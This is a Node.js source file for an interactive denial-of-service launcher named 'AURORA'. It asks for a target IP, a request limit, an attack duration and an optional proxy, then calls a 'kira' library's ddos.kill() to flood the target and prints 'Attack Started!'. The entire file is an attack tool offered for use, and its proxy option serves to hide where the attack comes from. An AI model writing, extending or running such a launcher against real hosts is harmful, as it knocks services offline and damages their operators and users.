const Kira = require("kira");
const ddos = new Kira();
const inquirer = require("inquirer");
const { exit } = require("process");
const { clear } = require("console");

clear();

console.log("                                                        ");
console.log(" ▄▄▄       █    ██  ██▀███   ▒█████   ██▀███   ▄▄▄      ");
console.log("▒████▄     ██  ▓██▒▓██ ▒ ██▒▒██▒  ██▒▓██ ▒ ██▒▒████▄    ");
console.log("▒██  ▀█▄  ▓██  ▒██░▓██ ░▄█ ▒▒██░  ██▒▓██ ░▄█ ▒▒██  ▀█▄  ");
console.log("░██▄▄▄▄██ ▓▓█  ░██░▒██▀▀█▄  ▒██   ██░▒██▀▀█▄  ░██▄▄▄▄██ ");
console.log(" ▓█   ▓██▒▒▒█████▓ ░██▓ ▒██▒░ ████▓▒░░██▓ ▒██▒ ▓█   ▓██▒");
console.log(" ▒▒   ▓▒█░░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░");
console.log("  ▒   ▒▒ ░░░▒░ ░ ░   ░▒ ░ ▒░  ░ ▒ ▒░   ░▒ ░ ▒░  ▒   ▒▒ ░");
console.log("  ░   ▒    ░░░ ░ ░   ░░   ░ ░ ░ ░ ▒    ░░   ░   ░   ▒   ");
console.log("      ░  ░   ░        ░         ░ ░     ░           ░  ░");
console.log("                                                        ");

call(async function () {
	let questions = [
		{
			type: "input",
			name: "targetIp",
			message: "[AURORA]: Target IP: ",
			validate: function (input) {
				if (!/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/.test(input)) {
					return "[AURORA]: Please Enter a Valide IP...";
				}
				// [number, number, number, number]
				const arrNumbers = input.split(".").map((val) => parseFloat(val));
				const wrongNumber = arrNumbers.find((val) => !(val >= 0 && val <= 255));
				if (wrongNumber == null) {
					return true;
				}
			},
			filter: function (input) {
				if (!/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/.test(input)) {
					return "";
				}
				// [number, number, number, number]
				const arrNumbers = input.split(".").map((val) => parseFloat(val));
				const wrongNumber = arrNumbers.find((val) => !(val >= 0 && val <= 255));
				if (wrongNumber == null) {
					return input;
				}
			},
		},
		{
			type: "input",
			name: "maxLimit",
			message: "[AURORA]: Max Limit: ",
			validate: function (value) {
				var valid = !isNaN(parseFloat(value));
				return valid || "[AURORA]: Please Enter a Number...";
			},
			filter: function (input) {
				if (!isNaN(parseFloat(input))) {
					return input;
				}
				return "";
			},
		},
		{
			type: "input",
			name: "attackLength",
			message: "[AURORA]: Length: ",
			validate: function (value) {
				var valid = !isNaN(parseFloat(value));
				return valid || "[AURORA]: Please Enter a Number...";
			},
			filter: function (input) {
				if (!isNaN(parseFloat(input))) {
					return input;
				}
				return "";
			},
		},
		{
			type: "input",
			name: "useProxy",
			message: "[AURORA]: Use Proxy? (Y/N) ",
			validate: function (value) {
				var valid = value.toLowerCase() == "y" || value.toLowerCase() == "n";
				return valid || "[AURORA]: Please Enter Y/N...";
			},
			filter: function (input) {
				if (input.toLowerCase() == "y" || input.toLowerCase() == "n") {
					return input;
				}
				return "";
			},
		},
		{
			type: "input",
			name: "proxyIp",
			message: "[AURORA]: Proxy IP: ",
			when: function (value) {
				return value.useProxy.toLowerCase() === "y";
			},
			validate: function (input) {
				if (!/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/.test(input)) {
					return "[AURORA]: Please Enter a Valide IP...";
				}
				// [number, number, number, number]
				const arrNumbers = input.split(".").map((val) => parseFloat(val));
				const wrongNumber = arrNumbers.find((val) => !(val >= 0 && val <= 255));
				if (wrongNumber == null) {
					return true;
				}
				return false;
			},
			filter: function (input) {
				if (!/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/.test(input)) {
					return "";
				}
				// [number, number, number, number]
				const arrNumbers = input.split(".").map((val) => parseFloat(val));
				const wrongNumber = arrNumbers.find((val) => !(val >= 0 && val <= 255));
				if (wrongNumber == null) {
					return input;
				}
			},
		},
		{
			type: "input",
			name: "proxyPort",
			message: "[AURORA]: Proxy Port: ",
			when: function (value) {
				return value.useProxy.toLowerCase() === "y";
			},
			validate: function (value) {
				var valid = !isNaN(parseFloat(value));
				return valid || "[AURORA]: Please Enter a Number...";
			},
			filter: function (input) {
				if (!isNaN(parseFloat(input))) {
					return input;
				}
				return "";
			},
		},
		{
			type: "input",
			name: "start",
			message: "[AURORA]: Start? (Y/N) ",
			validate: function (value) {
				var valid = value.toLowerCase() == "y" || value.toLowerCase() == "n";
				return valid || "[AURORA]: Please Enter Y/N...";
			},
			filter: function (input) {
				if (input.toLowerCase() == "y" || input.toLowerCase() == "n") {
					return input;
				}
				return "";
			},
		},
	];

	const answers = await inquirer.prompt(questions);

	if (answers.useProxy.toLowerCase() === "y") {
		if (answers.start.toLowerCase() === "n") {
			setTimeout(exit, 1000);
		} else if (answers.start.toLowerCase() === "y") {
			try {
				setTimeout(() => {
					clear();
					console.log("[AURORA]: Attack Started!");
					ddos.kill(`${answers.targetIp.replace(/\s/g, "")}`, parseInt(answers.maxLimit.replace(/\s/g, "")), parseInt(answers.attackLength.replace(/\s/g, "")), `${answers.proxyIp.replace(/\s/g, "")}:${parseInt(answers.proxyPort.replace(/\s/g, ""))}`);
				}, 1000);
			} catch (err) {
				console.log("[AURORA]: " + err);
			}
		}
	} else if (answers.useProxy.toLowerCase() === "n") {
		if (answers.start.toLowerCase() === "n") {
			setTimeout(exit, 1000);
		} else if (answers.start.toLowerCase() === "y") {
			try {
				setTimeout(() => {
					clear();
					console.log("[AURORA]: Attack Started!");
					ddos.kill(`${answers.targetIp.replace(/\s/g, "")}`, parseInt(answers.maxLimit.replace(/\s/g, "")), parseInt(answers.attackLength.replace(/\s/g, "")));
				}, 1000);
			} catch (err) {
				console.log("[AURORA]: " + err);
			}
		}
	}
});

function call(fn) {
	return fn();
}

/* 

Ты чего забыл тут?

⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄⠄ 
⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄ 
⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄ 
⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄ 
⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋⣰ 
⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀⣤ 
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿⡗ 
⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄ 
⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄ 
⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃⠄ 
⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄ 
⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄⠄ 
⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄ 
⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠⣴ 
⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿⣿ 

*/
